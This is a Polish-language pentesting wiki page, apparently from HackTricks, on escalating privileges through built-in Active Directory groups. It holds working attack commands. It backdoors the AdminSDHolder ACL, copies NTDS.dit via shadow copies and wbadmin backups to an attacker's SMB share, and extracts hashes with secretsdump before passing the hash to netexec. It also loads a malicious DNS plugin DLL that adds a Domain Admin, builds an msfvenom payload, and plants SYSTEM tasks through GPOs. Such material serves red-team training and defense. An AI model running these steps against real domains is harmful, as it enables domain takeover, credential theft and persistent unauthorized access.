# Grupy uprzywilejowane

{{#include ../../banners/hacktricks-training.md}}

## Dobrze znane grupy z uprawnieniami administracyjnymi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ta grupa ma uprawnienia do tworzenia kont i grup, które nie są administratorami w domenie. Ponadto umożliwia lokalne logowanie do kontrolera domeny (DC).

Aby zidentyfikować członków tej grupy, wykonuje się następujące polecenie:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Dodawanie nowych użytkowników jest dozwolone, podobnie jak lokalne logowanie do DC.<sup>[[1]](#references)</sup>

Warunkowa ścieżka od zarządzania kontami do dostępu administratora lokalnego prowadzi przez **zwykłą grupę, której delegowano odczyt hasła LAPS komputera**. Sprawdź efektywne uprawnienia do zapisu członkostwa w tej konkretnej grupie, czy jest ona chroniona oraz czy nowe lub kontrolowane konto może faktycznie do niej dołączyć. Przed sprawdzeniem uprawnień konta do odczytu LAPS na komputerze docelowym odśwież token konta. W przypadku szyfrowanego Windows LAPS uprawnienie do odczytu w katalogu i uprawnienia do odszyfrowania hasła to osobne wymagania; samo członkostwo w grupie lub członkostwo w Account Operators nie potwierdza żadnego z nich. Zobacz [zakres uprawnień Account Operators opisany przez Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) oraz [delegowanie Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Grupa AdminSDHolder

Access Control List (ACL) grupy **AdminSDHolder** ma kluczowe znaczenie, ponieważ ustala uprawnienia dla wszystkich „grup chronionych” w Active Directory, w tym grup o wysokich uprawnieniach. Mechanizm ten zapewnia bezpieczeństwo tych grup, zapobiegając nieautoryzowanym modyfikacjom.

Atakujący może to wykorzystać, modyfikując ACL grupy **AdminSDHolder** i przyznając pełne uprawnienia zwykłemu użytkownikowi. W praktyce dałoby to temu użytkownikowi pełną kontrolę nad wszystkimi grupami chronionymi. Jeśli uprawnienia tego użytkownika zostaną zmienione lub usunięte, zostaną automatycznie przywrócone w ciągu godziny ze względu na konstrukcję systemu.<sup>[[14]](#references)</sup>

Najnowsza dokumentacja Windows Server nadal uznaje kilka wbudowanych grup operatorów za obiekty **chronione** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` itd.). Proces **SDProp** działa domyślnie co 60 minut na **PDC Emulator**, ustawia `adminCount=1` i wyłącza dziedziczenie na obiektach chronionych. Przydaje się to zarówno do utrzymywania trwałości, jak i do wyszukiwania nieaktualnych uprzywilejowanych użytkowników, którzy zostali usunięci z grupy chronionej, ale nadal mają ACL wyłączającą dziedziczenie.<sup>[[12]](#references)</sup>

Polecenia służące do sprawdzenia członków i modyfikacji uprawnień:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Dostępny jest skrypt przyspieszający proces przywracania: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Więcej informacji znajdziesz na stronie [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## Kosz AD

Widoczność usuniętych obiektów zależy od efektywnych uprawnień katalogu; sama nazwa grupy nie dowodzi, że bieżąca tożsamość może wyświetlać ani przywracać obiekt. Funkcja AD Recycle Bin musi być włączona przed usunięciem, aby możliwe było pełne przywrócenie, które wymaga również uprawnienia Reanimate-Tombstones w katalogu głównym kontekstu nazewnictwa, uprawnień do zmiany nazwy oraz CREATE_CHILD w kontenerze docelowym. [Wskazówki Microsoft dotyczące Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) oraz [reguły autoryzacji przywracania](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) rozróżniają te warunki. Autoryzowana tożsamość z uprawnieniami do odczytu usuniętych obiektów może sprawdzać rekordy, które mogą ujawniać poufne informacje:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Jest to przydatne do **odtwarzania wcześniejszych ścieżek eskalacji uprawnień**. Usunięte obiekty mogą nadal ujawniać `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, stare SPN-y lub DN usuniętej uprzywilejowanej grupy, którą inny operator może później przywrócić.

Atrybuty zdefiniowane przez aplikację mogą również zachowywać stare dane uwierzytelniające, gdy obiekt pozostaje w stanie usuniętym. Traktuj to jako osobny trop do weryfikacji: bieżąca tożsamość musi mieć uprawnienia do wyliczenia usuniętego obiektu **i** odczytu tego atrybutu, wartość musi być użytecznym poświadczeniem, a aktywny podmiot musi je akceptować. Członkostwo w grupie ani sama nazwa usuniętego konta nie potwierdzają żadnego z tych kroków; podczas rutynowego wyliczania unikaj wyświetlania wartości poświadczeń. [Dokumentacja Microsoft dotycząca Kosza](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) opisuje zachowywanie atrybutów po usunięciu.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Dostęp do kontrolera domeny

Dostęp do plików na DC jest ograniczony, chyba że użytkownik należy do grupy `Server Operators`, co zmienia poziom dostępu.

### Privilege Escalation

Za pomocą `PsService` lub `sc` z Sysinternals można sprawdzać i modyfikować uprawnienia usług. Na przykład grupa `Server Operators` ma pełną kontrolę nad niektórymi usługami, co pozwala na wykonywanie dowolnych poleceń i eskalację uprawnień:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

To polecenie pokazuje, że grupa `Server Operators` ma pełny dostęp, co umożliwia manipulowanie usługami w celu uzyskania podwyższonych uprawnień.

## Backup Operators

Członkostwo w grupie `Backup Operators` może zapewnić uprawnienia `SeBackupPrivilege` i `SeRestorePrivilege` na hoście, zależnie od jego lokalnych zasad i sesji logowania. Sprawdź **efektywny token procesu wykonującego polecenia** za pomocą `whoami /groups` i `whoami /priv`: samo członkostwo nie dowodzi, że uprawnienie `SeBackupPrivilege` jest obecne i włączone. Jeśli uprawnienie jest obecne, ale wyłączone, można je włączyć w tym tokenie; jeśli go brakuje lub zostało usunięte, te operacje tworzenia kopii zapasowych nie mogą go użyć. `SeBackupPrivilege` umożliwia chroniony **odczyt** za pomocą API obsługujących kopie zapasowe (na przykład `FILE_FLAG_BACKUP_SEMANTICS` lub `robocopy /B`); `SeRestorePrivilege` to odrębne uprawnienie do operacji przywracania/zapisu. Zwykłe wyświetlanie zawartości katalogów i kopiowanie nie musi korzystać z semantyki kopii zapasowych.<sup>[[1]](#references)</sup>

Aby wyświetlić członków grupy, wykonaj:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Atak lokalny

Na hoście, na którym efektywny token ma uprawnienie `SeBackupPrivilege`, poniższa kopia uwzględniająca uprawnienia backupu może odczytać chroniony plik:

1. Zaimportuj niezbędne biblioteki:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Jeśli uprawnienie jest dostępne, ale wyłączone, włącz je i sprawdź jego stan w tym procesie:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Skopiuj plik z ograniczonego katalogu, na przykład:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### Atak AD

`NTDS.dit` to baza danych Active Directory na **kontrolerze domeny (DC)**. Ta metoda wymaga odpowiedniego tokenu na DC oraz dostępu do woluminu zawierającego bazę danych; członkostwo w grupie Backup Operators w innym miejscu nie zapewnia dostępu do konkretnego DC. Działająca baza danych jest zwykle zablokowana, dlatego przed jej skopiowaniem użyj dostępnej kopii shadow copy lub innego mechanizmu tworzenia kopii zapasowych. Utworzenie lub udostępnienie shadow copy zależy również od konfiguracji VSS hosta i uprawnień wywołującego. Poniższy przykład zakłada, że DC przechowuje `NTDS.dit` na dysku `C:` w lokalizacji `\Windows\NTDS`; w przeciwnym razie dostosuj wolumin i ścieżkę.

#### Używanie diskshadow.exe

1. Jeśli masz odpowiednie uprawnienia, utwórz i udostępnij shadow copy dysku `C:` DC jako `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Skopiuj `NTDS.dit` z kopii w tle:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternatywnie użyj `robocopy` do kopiowania plików:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Zapisz hive `SYSTEM` kontrolera domeny na potrzeby ekstrakcji offline. `SAM` to lokalna baza kont w systemach członkowskich; hive `SAM` kontrolera domeny nie zastępuje `NTDS.dit` ani nie jest źródłem hasha konta Administratora domeny:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Przenieś `ntds.dit` i `SYSTEM.SAV` na hosta analitycznego i wyodrębnij hashe kont domenowych. Zapisany hive `SAM` z systemu członkowskiego wraz z pasującym hive `SYSTEM` pozwala uzyskać hashe kont lokalnych:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Jeśli hash **Administratora domeny** został odzyskany z `NTDS.dit`, można go sprawdzić pod kątem uwierzytelniania w domenie. Lokalny hash Administratora z `SAM.SAV` to inne dane uwierzytelniające i nie umożliwia uwierzytelnienia jako Administrator domeny.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Using wbadmin.exe

1. Skonfiguruj system plików NTFS dla serwera SMB na maszynie atakującego i zapisz dane uwierzytelniające SMB w pamięci podręcznej na maszynie docelowej.
2. Użyj `wbadmin.exe`, aby wykonać kopię zapasową systemu i wyodrębnić `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Aby zobaczyć praktyczną demonstrację, obejrzyj [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Członkowie grupy **DnsAdmins** mogą wykorzystać swoje uprawnienia do załadowania dowolnej biblioteki DLL z uprawnieniami SYSTEM na serwerze DNS, często hostowanym na kontrolerach domeny. Ta możliwość stwarza znaczny potencjał do przeprowadzenia exploitacji.

Aby wyświetlić członków grupy DnsAdmins, użyj:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Wykonanie dowolnej biblioteki DLL (CVE‑2021‑40469)

> [!NOTE]
> Ta podatność umożliwia wykonanie dowolnego kodu z uprawnieniami SYSTEM w usłudze DNS (zwykle na kontrolerach domeny). Problem został naprawiony w 2021 roku.

Członkowie mogą sprawić, że serwer DNS załaduje dowolną bibliotekę DLL (lokalnie lub z udziału zdalnego), używając poleceń takich jak:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Ponowne uruchomienie usługi DNS (co może wymagać dodatkowych uprawnień) jest konieczne, aby biblioteka DLL została załadowana:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Więcej informacji na temat tego wektora ataku znajdziesz na stronie ired.team.

#### Mimilib.dll

Można też użyć mimilib.dll do wykonywania poleceń, modyfikując ją tak, aby wykonywała określone polecenia lub uruchamiała reverse shell. [Więcej informacji znajdziesz w tym poście](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).<sup>[[15]](#references)</sup>

### Rekord WPAD dla MitM

DNSAdmins mogą manipulować rekordami DNS, aby przeprowadzać ataki Man-in-the-Middle (MitM), tworząc rekord WPAD po wyłączeniu globalnej listy blokowania zapytań. Do podszywania się i przechwytywania ruchu sieciowego można użyć narzędzi takich jak Responder lub Inveigh.

### Event Log Readers
Członkowie mogą uzyskiwać dostęp do dzienników zdarzeń, w których potencjalnie można znaleźć poufne informacje, takie jak hasła zapisane jawnym tekstem lub szczegóły dotyczące wykonywania poleceń:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Uprawnienia Exchange Windows

Ta grupa może modyfikować DACL domeny, potencjalnie przyznając uprawnienia DCSync. Techniki eskalacji uprawnień wykorzystujące tę grupę opisano w repozytorium GitHub Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Jeśli możesz działać jako członek tej grupy, klasyczne nadużycie polega na przyznaniu kontrolowanemu przez atakującego podmiotowi uprawnień replikacji niezbędnych do [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historycznie **PrivExchange** łączył dostęp do skrzynki pocztowej, wymuszanie uwierzytelniania Exchange i LDAP relay, aby uzyskać tę samą możliwość. Nawet jeśli ta ścieżka relay jest zabezpieczona, bezpośrednie członkostwo w `Exchange Windows Permissions` lub kontrola nad serwerem Exchange nadal stanowią wartościową drogę do uzyskania uprawnień do replikacji domeny.

## Hyper-V Administrators

Grupa Hyper-V Administrators ma pełny dostęp do Hyper-V, co można wykorzystać do przejęcia kontroli nad zwirtualizowanymi kontrolerami domeny. Obejmuje to klonowanie działających DC i wyodrębnianie hashy NTLM z pliku NTDS.dit.

### Przykład wykorzystania

W praktyce nadużycie zwykle polega na **dostępie offline do dysków/punktów kontrolnych DC**, a nie na starych sztuczkach LPE na poziomie hosta. Mając dostęp do hosta Hyper-V, operator może utworzyć punkt kontrolny lub wyeksportować zwirtualizowany kontroler domeny, zamontować plik VHDX i wyodrębnić `NTDS.dit`, `SYSTEM` oraz inne sekrety bez ingerowania w LSASS wewnątrz maszyny gościa:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Stamtąd ponownie wykorzystaj workflow `Backup Operators`, aby skopiować `Windows\NTDS\ntds.dit` i registry hives w trybie offline. Powiązany workflow dotyczący plików kopii zapasowych:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Ta grupa pozwala członkom tworzyć Group Policies w domenie. Jej członkowie nie mogą jednak stosować group policies do użytkowników ani grup, ani edytować istniejących GPO.

Ważny szczegół: **twórca staje się właścicielem nowego GPO** i zazwyczaj uzyskuje wystarczające uprawnienia, by później je edytować. Oznacza to, że ta grupa jest interesująca, gdy możesz:

- utworzyć złośliwe GPO i przekonać administratora, aby podlinkował je do docelowej OU/domeny
- edytować utworzone przez siebie GPO, które jest już podlinkowane w przydatnym miejscu
- nadużyć innych delegowanych uprawnień pozwalających podlinkować GPO, podczas gdy ta grupa zapewnia możliwość jego edycji

Praktyczne nadużycie tych uprawnień zwykle polega na wprowadzeniu przez pliki zasad oparte na SYSVOL zmiany dotyczącej **Immediate Task**, **skryptu startowego**, **członkostwa w lokalnej grupie administratorów** lub **przypisania praw użytkownika**.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Jeśli edytujesz GPO ręcznie przez `SYSVOL`, pamiętaj, że sama zmiana nie wystarczy: należy również zaktualizować `versionNumber`, `GPT.ini`, a czasem także `gPCMachineExtensionNames`, w przeciwnym razie klienci zignorują odświeżenie zasad.<sup>[[9]](#references)</sup>

## Organization Management

W środowiskach, w których wdrożono **Microsoft Exchange**, specjalna grupa o nazwie **Organization Management** ma znaczące uprawnienia. Grupa ta ma uprawnienia do **dostępu do skrzynek pocztowych wszystkich użytkowników domeny** oraz **pełną kontrolę nad jednostką organizacyjną (OU) 'Microsoft Exchange Security Groups'**. Ta kontrola obejmuje grupę **`Exchange Windows Permissions`**, którą można wykorzystać do eskalacji uprawnień.

### Wykorzystywanie uprawnień i polecenia

#### Print Operators

Członkowie grupy **Print Operators** mają kilka uprawnień, w tym **`SeLoadDriverPrivilege`**, które pozwala im **logować się lokalnie na kontrolerze domeny**, wyłączać go i zarządzać drukarkami. Wykorzystanie tych uprawnień, zwłaszcza gdy **`SeLoadDriverPrivilege`** nie jest widoczne w kontekście bez podwyższonych uprawnień, wymaga obejścia funkcji Kontrola konta użytkownika (UAC).<sup>[[1]](#references)</sup>

Do wyświetlenia listy członków tej grupy służy następujące polecenie PowerShell:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Na kontrolerach domeny ta grupa jest niebezpieczna, ponieważ domyślna zasada kontrolera domeny przyznaje grupie **`SeLoadDriverPrivilege`**. Jeśli uzyskasz podwyższony token członka tej grupy, możesz włączyć to uprawnienie i załadować podpisany, ale podatny sterownik, aby uzyskać dostęp do jądra/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Szczegóły dotyczące obsługi tokenów znajdziesz w sekcji [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Członkowie tej grupy uzyskują dostęp do komputerów za pośrednictwem protokołu Remote Desktop Protocol (RDP). Do wyliczenia członków grupy można użyć poleceń PowerShell:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Dodatkowe informacje na temat wykorzystywania RDP można znaleźć w dedykowanych materiałach dotyczących pentestingu.

#### Remote Management Users

Członkowie mogą uzyskiwać dostęp do komputerów za pośrednictwem **Windows Remote Management (WinRM)**. Członków tej grupy można wyliczyć za pomocą:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

W przypadku technik exploitation związanych z **WinRM** należy zapoznać się z odpowiednią dokumentacją.

#### Server Operators

Ta grupa ma uprawnienia do wykonywania różnych konfiguracji na kontrolerach domeny, w tym uprawnienia do tworzenia kopii zapasowych i przywracania, zmiany czasu systemowego oraz wyłączania systemu.<sup>[[1]](#references)</sup> Aby wyliczyć jej członków, użyj polecenia:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Na kontrolerach domeny członkowie grupy `Server Operators` często dziedziczą wystarczające uprawnienia, aby **zmieniać konfigurację usług lub je uruchamiać/zatrzymywać**, a także otrzymują `SeBackupPrivilege`/`SeRestorePrivilege` w ramach domyślnej zasad DC. W praktyce czyni ich to pomostem między **nadużywaniem kontroli nad usługami** a **ekstrakcją NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Brak możliwości wylistowania usług nie wyklucza dostępu do **znanej usługi**. Service Control Manager sprawdza `SC_MANAGER_ENUMERATE_SERVICE` osobno dla wylistowania usług, a `SC_MANAGER_CONNECT` — dla połączenia; otwarcie usługi po nazwie wymaga jej własnych uprawnień, w tym `SERVICE_CHANGE_CONFIG` i `SERVICE_START`. Sprawdź efektywny token i ACL tej usługi, nawet jeśli ogólne polecenie `sc.exe query` się nie powiedzie. Same uprawnienia do konfiguracji to tylko punkt wyjścia: tożsamość usługi, uprawnienia do jej uruchamiania/zatrzymywania i dostępny wyzwalacz nadal decydują o tym, czy możliwe jest przejście do wyższych uprawnień. Zobacz [dokumentację Microsoft dotyczącą praw dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Jeśli ACL usługi przyznaje tej grupie uprawnienia do zmiany konfiguracji i uruchamiania, ustaw w usłudze dowolne polecenie, uruchom ją jako `LocalSystem`, a następnie przywróć pierwotny `binPath`. Jeśli kontrola usług jest zablokowana, skorzystaj z opisanych wyżej technik `Backup Operators`, aby skopiować `NTDS.dit`.

## References

- [1] [ired.team – Konta uprzywilejowane i uprawnienia tokenów](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Wykorzystanie SeLoadDriverPrivilege do eskalacji uprawnień](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Wykorzystanie uprawnień GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Wykorzystanie GPO, część 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Przewodnik red teamera po GPO i OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Funkcja ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — anonimowy LDAP → password spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Dodatek C: konta i grupy chronione w Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Jak wykorzystać i umieścić backdoor w AdminSDHolder, aby uzyskać trwały dostęp jako Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Wykorzystanie uprawnienia DnsAdmins do eskalacji w Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informacje o wykorzystaniu krawędzi GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Funkcja NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
